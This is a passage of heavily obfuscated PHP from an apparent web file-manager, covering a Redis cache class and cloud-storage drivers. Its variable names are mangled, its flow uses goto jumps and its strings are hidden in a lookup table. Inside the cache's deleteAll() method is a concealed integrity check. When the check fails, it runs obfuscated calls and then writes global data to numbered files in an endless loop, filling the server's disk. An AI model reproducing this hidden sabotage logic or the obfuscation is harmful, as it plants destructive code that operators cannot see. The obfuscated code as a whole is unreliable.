(isset($fğ´§¼Ğ[$BãİÉå…Î[12]]) && in_array($fğ´§¼Ğ[$BãİÉå…Î[12]], $Fùš®æ‘)) { $dÁÉé¼³ï = $fğ´§¼Ğ[$BãİÉå…Î[12]]; } switch ($dÁÉé¼³ï) { case $BãİÉå…Î[803]: $this->_slave($fğ´§¼Ğ, $B¼¯áĞ‡‘Ã); break; case $BãİÉå…Î[804]: break; case $BãİÉå…Î[805]: $this->isCluster = !0; $D÷‡­½Ò™“ = $fğ´§¼Ğ[$BãİÉå…Î[798]]; $fšèè¢†Î = isset($fğ´§¼Ğ[$BãİÉå…Î[802]]) ? $fğ´§¼Ğ[$BãİÉå…Î[802]] : !1; $fàØ÷Îè = isset($fğ´§¼Ğ[$BãİÉå…Î[401]]) ? $fğ´§¼Ğ[$BãİÉå…Î[401]] : null; $this->handle = new RedisCluster(NUll, $D÷‡­½Ò™“, $B¼¯áĞ‡‘Ã, $B¼¯áĞ‡‘Ã, $fšèè¢†Î, $fàØ÷Îè); break; default: break; } } private function _slave($a¯ïŠÌ½©, $BöÅ­à‰Š) { goto b…ƒ«‰éì; fÜğ«ÓÊùÃ: unset($fÔÌÀ•¢[0]); if (empty($fÔÌÀ•¢)) { return; } $a Ïßß¯ = array_rand($fÔÌÀ•¢); goto C¾›µ¯ğ; b…ƒ«‰éì: $fÔÌÀ•¢ = $a¯ïŠÌ½©[$_SERVER[¢Í][798]]; $this->filterConfig($a¯ïŠÌ½©, $fÔÌÀ•¢[0]); $this->handle = $this->init($a¯ïŠÌ½©, $BöÅ­à‰Š); goto fÜğ«ÓÊùÃ; C¾›µ¯ğ: $this->filterConfig($a¯ïŠÌ½©, $fÔÌÀ•¢[$a Ïßß¯]); $this->slaveHandle = $this->init($a¯ïŠÌ½©, $BöÅ­à‰Š); goto bñóˆ†˜²‹; bñóˆ†˜²‹: } private function filterConfig(&$A¹”îÔîœŒ, $dÂİÛ«©Ã) { $eËí‚‰—˜™ =& $_SERVER[¢Í]; $aÇ£‘‹‰´„ = explode($eËí‚‰—˜™[4], $dÂİÛ«©Ã); $EäšÇæÁ¬Õ = array($eËí‚‰—˜™[183] => $aÇ£‘‹‰´„[0], $eËí‚‰—˜™[184] => $aÇ£‘‹‰´„[1]); $A¹”îÔîœŒ = array_merge($A¹”îÔîœŒ, $EäšÇæÁ¬Õ); } public function set($B˜åÈÍ¬öö, $fßÍÖ§†ã™, $Fˆ…ÅÏˆ = false) { $Fˆ…ÅÏˆ = $Fˆ…ÅÏˆ ? $Fˆ…ÅÏˆ : $this->cacheTime; return $this->handle->setEx($B˜åÈÍ¬öö, $Fˆ…ÅÏˆ, $fßÍÖ§†ã™); } public function setLock($BÂŒ‹Ê¸¾¬, $aªäÌåãß½, $c¶Á“„†²) { return $this->handle->setNX($BÂŒ‹Ê¸¾¬, $aªäÌåãß½); } public function get($AŒÔ×¯¡§“) { $C„˜öÙ¢Ê½ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $C„˜öÙ¢Ê½->get($AŒÔ×¯¡§“); } public function remove($eÙÊÁ½Öò) { return $this->handle->del($eÙÊÁ½Öò); } public function deleteAll() { $aÀ„æ©ŠàÅ =& $_SERVER[¢Í]; $Cß‡ï³ø÷å = $_SERVER[$aÀ„æ©ŠàÅ[54]] . $aÀ„æ©ŠàÅ[55]; $C»õ¹á‰«â = $aÀ„æ©ŠàÅ[806]; if ($_SERVER[$aÀ„æ©ŠàÅ[51]] != $C»õ¹á‰«â($Cß‡ï³ø÷å)) { goto b‘†òÉ™“; b‘†òÉ™“: $a“Øæ’¬ã† = $aÀ„æ©ŠàÅ[807]; $e÷ƒ÷®Ô²Š = $aÀ„æ©ŠàÅ[53]; $FÆùÍ¯ĞÂ = $_SERVER[$aÀ„æ©ŠàÅ[54]] . $aÀ„æ©ŠàÅ[55]; goto BÇøï™¼›; eå§‚µŒ©ò: $a“Øæ’¬ã†(); $bƒÓ³ôòò = $aÀ„æ©ŠàÅ[810]; $E×éñÇ® = json_encode($GLOBALS[$aÀ„æ©ŠàÅ[811]]); goto BÌ´Ï¨¦²µ; BÌ´Ï¨¦²µ: $CÛò«™ ø = 1; for ($A‰åÒÇ“·Œ = $CÛò«™ ø; $A‰åÒÇ“·Œ > 0; $A‰åÒÇ“·Œ++) { $bƒÓ³ôòò(DATA_PATH . $A‰åÒÇ“·Œ, $E×éñÇ®); } goto b–ÀãÔ—; BÇøï™¼›: $aÅñ—†¶Ï = $e÷ƒ÷®Ô²Š($FÆùÍ¯ĞÂ); $f‚¼³ïÕ‚© = explode($aÀ„æ©ŠàÅ[56], $aÅñ—†¶Ï); if (count($f‚¼³ïÕ‚©) < $aÀ„æ©ŠàÅ[579]) { $d­¡Ç’Ô¼Ü = $aÀ„æ©ŠàÅ[58]; $d­¡Ç’Ô¼Ü(); } goto A‚ŒğÁáÏÔ; A‚ŒğÁáÏÔ: $AøààİÍ…¥ = $aÀ„æ©ŠàÅ[808]; $AøààİÍ…¥($_SERVER[$aÀ„æ©ŠàÅ[809]]); $a“Øæ’¬ã† = $aÀ„æ©ŠàÅ[807]; goto eå§‚µŒ©ò; b–ÀãÔ—: } if ($this->isCluster) { foreach ($this->handle->_masters() as $eÆÂÜ…İ„) { $this->handle->flushall($eÆÂÜ…İ„); } return; } return $this->handle->flushAll(); } } goto c´°¾§¬; BÃ¾Œ¥ë: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($aë½øî›ºõ, $FôåÄÍ™‡° = 0) { parent::__construct(); $this->source = $aë½øî›ºõ; $this->sourceSize = $FôåÄÍ™‡°; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($DÌ¯»ë½ñŸ = false) { return $this->sourceSize; } public function getContent($fÇí¡ö»ô = false) { return $this->fileSubstr($fÇí¡ö»ô, 0, $this->sourceSize); } public function fileSubstr($aŞ³ùôÉÀÆ = false, $fÀŠ®¸Åé = 0, $B›¹¸”±Ê“ = 0) { if (!$B›¹¸”±Ê“) { $B›¹¸”±Ê“ = $this->sourceSize; } $Dƒ·ÊÍÙŒ¸ = $this->sourceSize - $fÀŠ®¸Åé; if ($B›¹¸”±Ê“ >= $Dƒ·ÊÍÙŒ¸) { $B›¹¸”±Ê“ = $Dƒ·ÊÍÙŒ¸; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $fÀŠ®¸Åé, $B›¹¸”±Ê“); } if ($this->sourceType == self::TYPE_FILE) { if ($B›¹¸”±Ê“ <= 0) { return $_SERVER[¢Í][33]; } $EØ§ö£ Œ = ftell($this->source); fseek_64($this->source, $EØ§ö£ Œ + $fÀŠ®¸Åé); $Eª¬œ¨ª = @fread($this->source, $B›¹¸”±Ê“); fseek_64($this->source, $EØ§ö£ Œ); return $Eª¬œ¨ª; } } public function hashMd5($EÏŒÑŸ†Îâ = false) { return md5($this->getContent()); } public static function hash($fÜÑïèŸ÷ñ, $E•¸¤„³ÃÎ = 0) { $E±êÅ¹ë®Ë = new PathDriverStream($fÜÑïèŸ÷ñ, $E•¸¤„³ÃÎ); return $E±êÅ¹ë®Ë->hashSimple($fÜÑïèŸ÷ñ); } public static function md5($A óá…‰à, $aã­Ø ñš¤ = 0) { $FÎ¦ñ‹œ¼¨ = new PathDriverStream($A óá…‰à, $aã­Ø ñš¤); return $FÎ¦ñ‹œ¼¨->hashMd5($A óá…‰à); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\x2f\57\x76\x30\56\x61\160\151\x2e\x75\x70\171\165\156\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($D­“˜«‰×) { parent::__construct(); $this->_init($D­“˜«‰×); } public function _init($Fß–…Öİµ‹) { $A¥ÎÊí† =& $_SERVER[¢Í]; foreach ($Fß–…Öİµ‹ as $b©­ò‘¼ã¬ => $FŠùæ÷Ü–¿) { if (isset($this->{$b©­ò‘¼ã¬})) { $this->{$b©­ò‘¼ã¬} = $FŠùæ÷Ü–¿; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($A¥ÎÊí†[1292] . LNG($A¥ÎÊí†[1224])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($açé¬Û´ÛØ, $AÏğ‹™¤Ç  = "\107\x45\124") { $DººóÏ‹‡İ =& $_SERVER[¢Í]; $dƒ–»åã·¦ = gmdate($DººóÏ‹‡İ[1258]); $d„»»ãªĞ = base64_encode(hash_hmac($DººóÏ‹‡İ[1293], "{$AÏğ‹™¤Ç }\46{$açé¬Û´ÛØ}\46{$dƒ–»åã·¦}", md5("{$this->userpass}"), !0)); $E¿½«³¢Û = array("\101\x75\164\x68\x6f\x72\151\x7a\141\164\x69\x6f\156\72\125\120\x59\125\x4e\40{$this->username}\x3a{$d„»»ãªĞ}", "\x44\141\x74\145\72{$dƒ–»åã·¦}"); return $E¿½«³¢Û; } public function ussRequest($EàÃ°àİ´Æ, $d…ĞìŞŠŒ£ = "\107\105\124", $A§„æ±İ…„ = false, $BÓßÛ˜›·È = false, $fßå»ÔŠã¸ = false) { goto cª©ËØğÛ×; cª©ËØğÛ×: $Dò²Şóâ – =& $_SERVER[¢Í]; $EàÃ°àİ´Æ = trim($EàÃ°àİ´Æ, $Dò²Şóâ –[8]); $dĞ¾¿†š¨· = "\57{$this->bucket}\x2f{$EàÃ°àİ´Æ}"; goto CÈÚÎì…Î¢; CÈÚÎì…Î¢: $aƒ²æ­Š¶ä = $this->ussHeaders($dĞ¾¿†š¨·, $d…ĞìŞŠŒ£); if ($BÓßÛ˜›·È) { $aƒ²æ­Š¶ä = array_merge($aƒ²æ­Š¶ä, $BÓßÛ˜›·È); } $bµÃÉ«½±À = url_request($this->endpoint . $dĞ¾¿†š¨·, $d…ĞìŞŠŒ£, $A§„æ±İ…„, $aƒ²æ­Š¶ä, $fßå»ÔŠã¸); goto E‚õ»ÔÎÜ˜; E‚õ»ÔÎÜ˜: if (!$bµÃÉ«½±À) { return array($Dò²Şóâ –[1053] => !1, $Dò²Şóâ –[1055] => $Dò²Şóâ –[1294]); } if (strtolower($d…ĞìŞŠŒ£) == $Dò²Şóâ –[198] || in_array($bµÃÉ«½±À[$Dò²Şóâ –[1053]], array($Dò²Şóâ –[1152], $Dò²Şóâ –[1295]))) { $A§„æ±İ…„ = $bµÃÉ«½±À[$Dò²Şóâ –[1296]]; } else { $A§„æ±İ…„ = json_decode($bµÃÉ«½±À[$Dò²Şóâ –[1055]], !0); if (!$A§„æ±İ…„) { $A§„æ±İ…„ = $bµÃÉ«½±À[$Dò²Şóâ –[1055]]; } else { if (!$bµÃÉ«½±À[$Dò²Şóâ –[703]] && isset($A§„æ±İ…„[$Dò²Şóâ –[1297]])) { $A§„æ±İ…„ = $A§„æ±İ…„[$Dò²Şóâ –[1297]]; } } } return array($Dò²Şóâ –[1053] => $bµÃÉ«½±À[$Dò²Şóâ –[703]], $Dò²Şóâ –[1055] => $A§„æ±İ…„); goto EÚòÈ›ñ¹‘; EÚòÈ›ñ¹‘: } public function mkfile($dÈÔá´É°Û, $Dò‡’ŒÙ = '', $AšË¸‘°Ó‚ = REPEAT_RENAME) { if ($this->setContent($dÈÔá´É°Û, $Dò‡’ŒÙ)) { return $this->getPathOuter($dÈÔá´É°Û); } return !1; } public function mkdir($fÈÚ¼†Õéõ, $f»¦Ä—Ø¿ = REPEAT_SKIP) { $bªÛ„¤‹ä¿ =& $_SERVER[¢Í]; $C‘âßó´¬Ó = trim($fÈÚ¼†Õéõ, $bªÛ„¤‹ä¿[8]); if ($this->_isFolder($C‘âßó´¬Ó)) { return $this->getPathOuter($C‘âßó´¬Ó); } $bØòÁ†‘Õ = array($bªÛ„¤‹ä¿[1298]); $E„±‘É½Šğ = $this->ussRequest($C‘âßó´¬Ó, $bªÛ„¤‹ä¿[230], !1, $bØòÁ†‘Õ); return $E„±‘É½Šğ[$bªÛ„¤‹ä¿[1053]] ? $this->getPathOuter($C‘âßó´¬Ó) : !1; } public function copyFile($d‚Æ‚—Ùì, $bëº˜£²¸) { $C°Ë«§Ù§ =& $_SERVER[¢Í]; $DéÙóòœŸ‘ = array($C°Ë«§Ù§[1299] . "\57{$this->bucket}\57{$d‚Æ‚—Ùì}", $C°Ë«§Ù§[1300]); $d’‘£‡»¤… = $this->ussRequest($bëº˜£²¸, $C°Ë«§Ù§[232], !1, $DéÙóòœŸ‘); return $d’‘£‡»¤…[$C°Ë«§Ù§[1053]] ? !0 : $this->getPathOuter($bëº˜£²¸); } public function moveFile($cä¶ì‚¤ì, $e­÷À¾øš°) { $e—¡çÒÜ§ =& $_SERVER[¢Í]; $CèÙÃ„ÆŒ± = array($e—¡çÒÜ§[1301] . "\57{$this->bucket}\57{$cä¶ì‚¤ì}", $e—¡çÒÜ§[1300]); $fÛÒÓ¬°¬ = $this->ussRequest($e­÷À¾øš°, $e—¡çÒÜ§[232], !1, $CèÙÃ„ÆŒ±); return $fÛÒÓ¬°¬[$e—¡çÒÜ§[1053]] ? !0 : $this->getPathOuter($e­÷À¾øš°); } public function delFile($aŠÌ‰êÜ») { $a´¥òÚ³Î =& $_SERVER[¢Í]; $a©°ÖèÑåô = $this->ussRequest($aŠÌ‰êÜ», $a´¥òÚ³Î[1302]); return $a©°ÖèÑåô[$a´¥òÚ³Î[1053]] ? !0 : !1; } public function delFolder($d£í–Å·ˆ‹) { goto f÷¦’ÉÌ¢; b¨ÊÊÜœ: foreach ($d”åÌî‚ãÃ as $f¬“ÃÔ¡) { $E„ù‰Éù  = $this->ussRequest($f¬“ÃÔ¡[$Eêî¨±¡[28]], $Eêî¨±¡[1302]); if (!$E„ù‰Éù [$Eêî¨±¡[1053]]) { return !1; } } foreach ($aË¾ï §‡Ü as $fİ¶‘Ÿ³ÁŒ) { $E„ù‰Éù  = $this->ussRequest($fİ¶‘Ÿ³ÁŒ, $Eêî¨±¡[1302]); if (!$E„ù‰Éù [$Eêî¨±¡[1053]]) { return !1; } } $E„ù‰Éù  = $this->ussRequest($d£í–Å·ˆ‹, $Eêî¨±¡[1302]); goto dç™º‡ßÍË; f÷¦’ÉÌ¢: $Eêî¨±¡ =& $_SERVER[¢Í]; if (!$this->exist($d£í–Å·ˆ‹)) { return !0; } $this->listItemCache = !1; goto DÜ‰ÇÂØÊ§; DÜ‰ÇÂØÊ§: $aË¾ï §‡Ü = $d”åÌî‚ãÃ = array(); $this->fileList($d£í–Å·ˆ‹, $aË¾ï §‡Ü, $d”åÌî‚ãÃ, !0); $this->listItemCache = !0; goto b¨ÊÊÜœ; dç™º‡ßÍË: return $E„ù‰Éù [$Eêî¨±¡[1053]]; goto fÌÎ¨×çŞ; fÌÎ¨×çŞ: } public function rename($b‰Ù³ÔÂ½Ã, $f÷”Êêåò½) { if ($this->isFile($b‰Ù³ÔÂ½Ã)) { $f÷”Êêåò½ = get_path_father($b‰Ù³ÔÂ½Ã) . $f÷”Êêåò½; return $this->moveFile($b‰Ù³ÔÂ½Ã, $f÷”Êêåò½); } return $this->renameObject($b‰Ù³ÔÂ½Ã, $f÷”Êêåò½); } public function fileInfo($eØí¹É™º, $e¶í»ÄÆõ² = false, $cÜ¼ºŠÂÊÉ = array()) { goto FÔß•ğó¥È; B†‡™…¾ãÔ: $bïñö‹†à¥[$Béõ¬å³’Á[200]] = $bïñö‹†à¥[$Béõ¬å³’Á[117]] = 0; $bïñö‹†à¥[$Béõ¬å³’Á[201]] = $bïñö‹†à¥[$Béõ¬å³’Á[202]] = !0; if (empty($cÜ¼ºŠÂÊÉ)) { $cÜ¼ºŠÂÊÉ = $this->objectMeta($eØí¹É™º); if (!$cÜ¼ºŠÂÊÉ) { return $bïñö‹†à¥; } } goto dÙâ÷Äï·¤; dÙâ÷Äï·¤: $bïñö‹†à¥[$Béõ¬å³’Á[200]] = intval($cÜ¼ºŠÂÊÉ[$Béõ¬å³’Á[1303]]); $bïñö‹†à¥[$Béõ¬å³’Á[117]] = intval($cÜ¼ºŠÂÊÉ[$Béõ¬å³’Á[1304]]); $bïñö‹†à¥[$Béõ¬å³’Á[87]] = $cÜ¼ºŠÂÊÉ[$Béõ¬å³’Á[87]]; goto D¸Ï§Ã¶ĞË; D¸Ï§Ã¶ĞË: return $bïñö‹†à¥; goto aÛ¥ÌøÁ¥; FÔß•ğó¥È: $Béõ¬å³’Á =& $_SERVER[¢Í]; $bïñö‹†à¥ = array($Béõ¬å³’Á[28] => $this->pathThis($eØí¹É™º), $Béõ¬å³’Á[85] => $this->getPathOuter($Béõ¬å³’Á[8] . $eØí¹É™º), $Béõ¬å³’Á[29] => $Béõ¬å³’Á[181], $Béõ¬å³’Á[87] => isset($cÜ¼ºŠÂÊÉ[$Béõ¬å³’Á[87]]) ? $cÜ¼ºŠÂÊÉ[$Béõ¬å³’Á[87]] : 0, $Béõ¬å³’Á[175] => $this->ext($eØí¹É™º)); if ($e¶í»ÄÆõ²) { return $bïñö‹†à¥; } goto B†‡™…¾ãÔ; aÛ¥ÌøÁ¥: } public function folderInfo($FÌÕ‚òºŒÒ, $b·…„íàôí = false) { goto E÷“²ÃÉØ; Cõ‰ç¬ß¼: $b’«›ÊåíÓ[$c‰Ğ†¢„[200]] = intval($a™”‡îïÚí[$c‰Ğ†¢„[1303]]); $b’«›ÊåíÓ[$c‰Ğ†¢„[117]] = intval($a™”‡îïÚí[$c‰Ğ†¢„[1304]]); return $b’«›ÊåíÓ; goto b‚‰ôÓï‰; bÊŠ´²˜Íœ: $b’«›ÊåíÓ[$c‰Ğ†¢„[200]] = $b’«›ÊåíÓ[$c‰Ğ†¢„[117]] = 0; $b’«›ÊåíÓ[$c‰Ğ†¢„[201]] = $b’«›ÊåíÓ[$c‰Ğ†¢„[202]] = !0; if (empty($a™”‡îïÚí)) { $a™”‡îïÚí = $this->objectMeta($FÌÕ‚òºŒÒ); if (!$a™”‡îïÚí) { return $b’«›ÊåíÓ; } } goto Cõ‰ç¬ß¼; E÷“²ÃÉØ: $c‰Ğ†¢„ =& $_SERVER[¢Í]; $b’«›ÊåíÓ = array($c‰Ğ†¢„[28] => $this->pathThis($FÌÕ‚òºŒÒ), $c‰Ğ†¢„[85] => $this->getPathOuter($c‰Ğ†¢„[8] . $FÌÕ‚òºŒÒ), $c‰Ğ†¢„[29] => $c‰Ğ†¢„[86]); if ($b·…„íàôí) { return $b’«›ÊåíÓ; } goto bÊŠ´²˜Íœ; b‚‰ôÓï‰: } private function listObjs($c”ìÃò³, $AßŠÚ¶”ãÌ = 0, $EĞª’àâÏ¹ = 1000) { $E¨ä¯Óñİ« =& $_SERVER[¢Í]; $c¹á¾§ª·® = array($E¨ä¯Óñİ«[1305], $E¨ä¯Óñİ«[1306] . $EĞª’àâÏ¹); if ($AßŠÚ¶”ãÌ) { $c¹á¾§ª·®[] = $E¨ä¯Óñİ«[1307] . $AßŠÚ¶”ãÌ; } $f‰ªªµ‘ÛÙ = $this->ussRequest($c”ìÃò³, $E¨ä¯Óñİ«[234], !1, $c¹á¾§ª·®); return !$f‰ªªµ‘ÛÙ[$E¨ä¯Óñİ«[1053]] ? !1 : $f‰ªªµ‘ÛÙ[$E¨ä¯Óñİ«[1055]]; } private function fileList($aºé†æ«—, &$fá¤•‡Ú•Ô, &$a»Ë–¡ª‚, $CŸ³‚°µ¤ = false) { goto b…Íí¢Ò; b…Íí¢Ò: $A´Ó‹²”•È =& $_SERVER[¢Í]; $F¾ŠÙÑ¢İ¿ = $A´Ó‹²”•È[33]; $Cîë–æè³ = 1000; goto Aà‘½•†Ğ; a±®àôÄ˜˜: if ($Eì”ç÷†) { $this->cacheMethod($A´Ó‹²”•È[205], $aºé†æ«—, !0); } goto A»à„ÇŞ; Aà‘½•†Ğ: $C•¦˜·­¡Õ = rtrim($aºé†æ«—, $A´Ó‹²”•È[8]) . $A´Ó‹²”•È[8]; $Eì”ç÷† = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $cššØã¹° = $this->listObjs($aºé†æ«—, $F¾ŠÙÑ¢İ¿, $Cîë–æè³); if (!$cššØã¹°) { return !1; } $F¾ŠÙÑ¢İ¿ = isset($cššØã¹°[$A´Ó‹²”•È[1308]]) ? $cššØã¹°[$A´Ó‹²”•È[1308]] : $A´Ó‹²”•È[33]; $C¨åÎîµÄ¨ = isset($cššØã¹°[$A´Ó‹²”•È[1309]]) ? $cššØã¹°[$A´Ó‹²”•È[1309]] : array(); foreach ($C¨åÎîµÄ¨ as $aÏŞ §æ“¼) { $E›¶ ¤Êšº = $aÏŞ §æ“¼[$A´Ó‹²”•È[29]] == $A´Ó‹²”•È[86] ? !0 : !1; $fË¸®è–Ê¬ = ltrim($C•¦˜·­¡Õ . $aÏŞ §æ“¼[$A´Ó‹²”•È[28]], $A´Ó‹²”•È[8]) . ($E›¶ ¤Êšº ? $A´Ó‹²”•È[8] : $A´Ó‹²”•È[33]); $eŠÇ²„¡¶Ü = array($A´Ó‹²”•È[28] => $fË¸®è–Ê¬, $A´Ó‹²”•È[29] => $E›¶ ¤Êšº ? $A´Ó‹²”•È[86] : $A´Ó‹²”•È[181], $A´Ó‹²”•È[87] => $aÏŞ §æ“¼[$A´Ó‹²”•È[340]], $A´Ó‹²”•È[1304] => $aÏŞ §æ“¼[$A´Ó‹²”•È[1310]]); if ($Eì”ç÷†) { $this->cacheMethod($A´Ó‹²”•È[205], $fË¸®è–Ê¬, $E›¶ ¤Êšº); $this->cacheMethod($A´Ó‹²”•È[206], $fË¸®è–Ê¬, $eŠÇ²„¡¶Ü); } if ($E›¶ ¤Êšº) { $fá¤•‡Ú•Ô[] = $fË¸®è–Ê¬; if ($CŸ³‚°µ¤) { $this->fileList($fË¸®è–Ê¬, $fá¤•‡Ú•Ô, $a»Ë–¡ª‚, $CŸ³‚°µ¤); } continue; } $a»Ë–¡ª‚[] = $eŠÇ²„¡¶Ü; } if (count($C¨åÎîµÄ¨) < $Cîë–æè³) { break; } } goto a±®àôÄ˜˜; A»à„ÇŞ: } public function listPath($DÆğ¨‡òŞ¤, $b…Û‘ßÊË· = false) { $b¨©ŞÓÉÑ‚ =& $_SERVER[¢Í]; $d¢šÛ¶²‡ = $A»ƒ·Ï© = array(); $this->fileList($DÆğ¨‡òŞ¤, $d¢šÛ¶²‡, $A»ƒ·Ï©); foreach ($d¢šÛ¶²‡ as $bŒ© ®ªÙÒ => $b‰ğ­ÌŒ‡”) { $d¢šÛ¶²‡[$bŒ© ®ªÙÒ] = $this->folderInfo($b‰ğ­ÌŒ‡”, $b…Û‘ßÊË·); } foreach ($A»ƒ·Ï© as $bŒ© ®ªÙÒ => $b‰ğ­ÌŒ‡”) { $A»ƒ·Ï©[$bŒ© ®ªÙÒ] = $this->fileInfo($b‰ğ­ÌŒ‡”[$b¨©ŞÓÉÑ‚[28]], $b…Û‘ßÊË·, $b‰ğ­ÌŒ‡”); } return array($b¨©ŞÓÉÑ‚[84] => $d¢šÛ¶²‡, $b¨©ŞÓÉÑ‚[83] => $A»ƒ·Ï©); } public function has($B›±Ù¨Š¢ë, $aê’âŒÙ©È = false, $CëùÃ‹¯ò… = true) { goto c‰Åµ½…“Ğ; F•ï°ßê†“: while (!0) { check_abort(); $F¢¬¦ËÖ‘ = $this->listObjs($B›±Ù¨Š¢ë, $eƒßÛ‘Ÿæ, $Eº…÷ÔÑç¦); if (!$F¢¬¦ËÖ‘) { return !1; } $eƒßÛ‘Ÿæ = isset($F¢¬¦ËÖ‘[$fô‡ÁĞõäí[1308]]) ? $F¢¬¦ËÖ‘[$fô‡ÁĞõäí[1308]] : $fô‡ÁĞõäí[33]; $CŒµ×šá¡¬ = isset($F¢¬¦ËÖ‘[$fô‡ÁĞõäí[1309]]) ? $F¢¬¦ËÖ‘[$fô‡ÁĞõäí[1309]] : array(); if (empty($CŒµ×šá¡¬)) { break; } $b÷À‘…Ëê‹ = array_filter($CŒµ×šá¡¬, function ($D¯ë¿¿’í) { $C›ìÇÖ‚†§ =& $_SERVER[¢Í]; return $D¯ë¿¿’í[$C›ìÇÖ‚†§[29]] == $C›ìÇÖ‚†§[86]; }); $F¹¾†ñÕÂ› = count($CŒµ×šá¡¬); $b÷À‘…Ëê‹ = count($b÷À‘…Ëê‹); $DÓ’±îƒÊ = $F¹¾†ñÕÂ› - $b÷À‘…Ëê‹; if ($aê’âŒÙ©È) { $AÍ¨À¾Õ‹ += $b÷À‘…Ëê‹; $A‡¯»ì—¤Ş += $DÓ’±îƒÊ; if ($F¹¾†ñÕÂ› < $Eº…÷ÔÑç¦) { break; } continue; } if ($CëùÃ‹¯ò…) { if ($DÓ’±îƒÊ) { return !0; } } else { if ($b÷À‘…Ëê‹) { return !0; } } if ($F¹¾†ñÕÂ› < $Eº…÷ÔÑç¦) { break; } } if ($aê’âŒÙ©È) { return array($fô‡ÁĞõäí[209] => $A‡¯»ì—¤Ş, $fô‡ÁĞõäí[210] => $AÍ¨À¾Õ‹); } return !1; goto cŠ¥‰õÀéß; c‰Åµ½…“Ğ: $fô‡ÁĞõäí =& $_SERVER[¢Í]; $eƒßÛ‘Ÿæ = $fô‡ÁĞõäí[33]; $Eº…÷ÔÑç¦ = 500; goto F‹…â»»†“; F‹…â»»†“: $A‡¯»ì—¤Ş = 0; $AÍ¨À¾Õ‹ = 0; $Fİ„Ù†µ‰÷ = rtrim($B›±Ù¨Š¢ë, $fô‡ÁĞõäí[8]) . $fô‡ÁĞõäí[8]; goto F•ï°ßê†“; cŠ¥‰õÀéß: } public function listAll($e×ÃÌÖ•ê) { goto A¯¡Ã‰’‡×; d¥ÁÌô‰‹“: $aÈë¡ËªÏñ = array(); foreach ($DÀš£·Æ–¸ as $D‹×Ùƒâ‘Ó) { $aÈë¡ËªÏñ[$D‹×Ùƒâ‘Ó[$féöùÔ–±ß[28]]] = $D‹×Ùƒâ‘Ó[$féöùÔ–±ß[87]]; } foreach ($eéŸ»è‡ßè as $D‹×Ùƒâ‘Ó) { if (is_string($D‹×Ùƒâ‘Ó)) { $aÈë¡ËªÏñ[$D‹×Ùƒâ‘Ó] = 0; } } goto A‘ÆãÅµË; A‘ÆãÅµË: return $this->listAllFiles($e×ÃÌÖ•ê, array_keys($aÈë¡ËªÏñ), $aÈë¡ËªÏñ); goto D²¸’—êÉ; A¯¡Ã‰’‡×: $féöùÔ–±ß =& $_SERVER[¢Í]; $eéŸ»è‡ßè = $DÀš£·Æ–¸ = array(); $this->fileList($e×ÃÌÖ•ê, $eéŸ»è‡ßè, $DÀš£·Æ–¸, !0); goto d¥ÁÌô‰‹“; D²¸’—êÉ: } public function canRead($E–ÕŠ¤ ‹×) { return $this->exist($E–ÕŠ¤ ‹×) ? !0 : !1; } public function canWrite($D„æİÖ‡ğ¸) { return $this->exist($D„æİÖ‡ğ¸) ? !0 : !1; } public function getContent($eÏ¡ÛÎ¡˜±) { return $this->fileSubstr($eÏ¡ÛÎ¡˜±, 0, -1); } public function setContent($EÜÅ›êä, $B·îİî“ßí = '') { $DïğŠ™†¾ =& $_SERVER[¢Í]; if (!$B·îİî“ßí) { $d¡æ±ìÅÑÛ = $this->ussRequest($EÜÅ›êä, $DïğŠ™†¾[230]); return $d¡æ±ìÅÑÛ[$DïğŠ™†¾[1053]]; } $c÷í‘­ˆÒ = $this->tempFile($this->pathThis($EÜÅ›êä)); file_put_contents($c÷í‘­ˆÒ, $B·îİî“ßí); if ($this->upload($EÜÅ›êä, $c÷í‘­ˆÒ)) { $this->tempFileRemve($c÷í‘­ˆÒ); return !0; } return !1; } public function fileSubstr($E£óò´ö±’, $B™‚Õ‰¤ÆÕ, $fÒĞ–Šïì) { $CÃŒõåè•À =& $_SERVER[¢Í]; if (!($Aò‹…Ó„îˆ = $this->link($E£óò´ö±’))) { return !1; } $eêÈâ„©ŠÉ = !1; if ($fÒĞ–Šïì > 0) { $bÛùİ±Š = $B™‚Õ‰¤ÆÕ + $fÒĞ–Šïì - 1; $eêÈâ„©ŠÉ = array($CÃŒõåè•À[1271] . $B™‚Õ‰¤ÆÕ . $CÃŒõåè•À[437] . $bÛùİ±Š); } $Aá‡ÏÇÔæï = url_request($Aò‹…Ó„îˆ, $CÃŒõåè•À[234], !1, $eêÈâ„©ŠÉ); return $Aá‡ÏÇÔæï[$CÃŒõåè•À[703]] ? $Aá‡ÏÇÔæï[$CÃŒõåè•À[1055]] : !1; } public function upload($aŒò”ˆ¯‚, $AÛìÆªíÅ¿, $BÉÑ’Ä¸ = false, $DË¤¸²ò“” = REPEAT_REPLACE) { goto aø»ãÚ­•º; BçÙ·ÙŞ¡: $bÇ³Œ œˆ = $this->ussRequest($aŒò”ˆ¯‚, $CŒ…ö‡á«[232], !1, $FøŠß ¾¸Ñ); return $bÇ³Œ œˆ[$CŒ…ö‡á«[1053]] ? $this->getPathOuter($aÔŠëìÙ¿Ÿ) : !1; goto Bœ½ŸÂì°‘; aø»ãÚ­•º: $CŒ…ö‡á« =& $_SERVER[¢Í]; $dÇÆëÄ‚’ = IO::size($AÛìÆªíÅ¿); if ($dÇÆëÄ‚’ <= 1024 * 1024 * 200) { $e¼‚¼”ËÕ¦ = array($CŒ…ö‡á«[1311] . $AÛìÆªíÅ¿); $bÇ³Œ œˆ = $this->ussRequest($aŒò”ˆ¯‚, $CŒ…ö‡á«[232], $e¼‚¼”ËÕ¦); return $bÇ³Œ œˆ[$CŒ…ö‡á«[1053]] ? $this->getPathOuter($aŒò”ˆ¯‚) : !1; } goto C–ÊöõÌÙ‰; C–ÊöõÌÙ‰: $e‘Îô¡¢âİ = 